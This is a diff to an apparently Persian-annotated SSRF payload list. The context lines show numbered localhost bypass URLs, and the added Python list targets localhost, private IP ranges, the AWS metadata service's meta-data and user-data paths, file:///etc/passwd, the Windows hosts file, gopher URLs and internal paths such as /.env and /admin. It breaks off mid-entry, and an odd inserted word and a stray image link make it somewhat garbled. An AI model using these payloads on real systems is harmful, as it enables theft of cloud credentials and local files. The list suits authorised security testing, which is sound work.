@@ -1,4 +1,4 @@
-1. http://[::1]  # IPv6 localhost
+نه1. http://[::1]  # IPv6 localhost
 2. http://0  # نسخه دهدهی localhost
 3. http://127.1  # کوتاه شده آی‌پی localhost
 4. http://127.0.1.1  # آی‌پی مشابه localhost
@@ -99,3 +99,107 @@
 99. http://127.0.0.1@%23example.com
 100. http://localhost@%2523example.com
 101. ![IMG_20250126_120819_303](https://github.com/user-attachments/assets/43d50970-4529-4d2e-8bbc-4be647ebe8aa)
+payloads = [
+    # تست به localhost و IP های خصوصی
+    "http://localhost:8080",
+    "http://127.0.0.1",
+    "http://169.254.169.254/latest/meta-data/",
+    "http://192.168.1.1",
+    "http://192.168.0.1",
+    "http://10.0.0.1",
+    "http://10.0.0.2",
+    "http://10.0.0.3",
+    "http://10.0.0.4",
+    "http://10.0.0.5",
+    
+    # تست به URLهای عمومی
+    "http://example.com",
+    "http://httpbin.org/get",
+    "http://api.ipify.org",
+    "http://jsonplaceholder.typicode.com/posts",
+    "http://httpbin.org/ip",
+    
+    # تست به منابع داخلی
+    "http://192.168.1.100/admin",
+    "http://192.168.1.101:8080",
+    "http://192.168.1.102:3000",
+    "http://192.168.1.103:5000",
+    "http://192.168.1.104:8000",
+    
+    # تست به AWS metadata
+    "http://169.254.169.254/latest/meta-data/",
+    "http://169.254.169.254/latest/user-data",
+    
+    # تست به سرویس‌های DNS
+    "http://dns.google.com",
+    "http://1.1.1.1",
+    
+    # تست به پروتکل‌های مختلف
+    "ftp://example.com",
+    "ftp://ftp.dlptest.com",
+    "file:///etc/passwd",  # تست برای دسترسی به فایل‌های محلی
+    "file:///C:/Windows/System32/drivers/etc/hosts",  # تست برای ویندوز
+    "gopher://example.com",
+    
+    # تست به URLهای خاص
+    "http://localhost:3000/api/v1/users",
+    "http://localhost:5000/api/v1/data",
+    "http://localhost:8000/api/v1/info",
+    
+    # تست به IP های عمومی
+    "http://8.8.8.8",
+    "http://1.1.1.1",
+    "http://208.67.222.222",
+    
+    # تست به URLهای خاص
+    "http://localhost:8080/admin",
+    "http://localhost:8080/login",
+    "http://localhost:8080/health",
+    
+    # تست به URLهای دیگر
+    "http://www.google.com",
+    "http://www.bing.com",
+    "http://www.yahoo.com",
+    
+    # تست به URLهای API
+    "http://api.github.com/users",
+    "http://api.openweathermap.org/data/2.5/weather?q=London",
+    
+    # تست به URLهای دیگر
+    "http://localhost:8080/robots.txt",
+    "http://localhost:8080/.env",
+    
+    # تست به URLهای دیگر
+    "http://localhost:8080/status",
+    "http://localhost:8080/version",
+    
+    # تست به URLهای دیگر
+    "http://localhost:8080/healthcheck",
+    "http://localhost:8080/api/v1/status",
+    
+    # تست به URLهای دیگر
+    "http://localhost:8080/api/v1/health",
+    "http://localhost:8080/api/v1/version",
+    
+    # تست به URLهای دیگر
+    "http://localhost:8080/api/v1/config",
+    "http://localhost:8080/api/v1/metrics",
+    
+    # تست به URLهای دیگر
+    "http://localhost:8080/api/v1/logs",
+    "http://localhost:8080/api/v1/debug",
+    
+    # تست به URLهای دیگر
+    "http://localhost:8080/api/v1/alerts",
+    "http://localhost:8080/api/v1/events",
+    
+    # تست به URLهای دیگر
+    "http://localhost:8080/api/v1/notifications",
+    "http://localhost:8080/api/v1/updates",
+    
+    # تست به URLهای دیگر
+    "http://localhost:8080/api/v1/commands",
+    "http://localhost:8080/api/v1/tasks",
+    
+    # تست به URLهای دیگر
+    "http
